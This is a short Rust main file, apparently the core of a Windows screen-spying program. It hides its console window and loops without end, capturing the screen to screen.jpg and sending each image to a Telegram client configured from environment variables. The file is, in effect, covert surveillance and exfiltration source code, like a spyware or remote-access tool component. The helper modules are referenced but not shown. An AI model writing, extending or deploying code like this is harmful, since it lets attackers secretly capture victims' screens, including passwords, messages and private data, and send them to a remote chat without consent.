#![windows_subsystem = "windows"]

use crate::screen_capture::save_screenshot;

mod telegram_client;
mod screen_capture;
mod screenshot_lib;

use std::time::{SystemTime};

#[tokio::main]
async fn main() {
    run().await;
}

async fn run() {
    let client = telegram_client::TelegramClient::from_env().await;
    let filename = String::from("screen.jpg");
    loop {
        save_screenshot(&filename);
        client.send_image(&filename).await;
    }
}
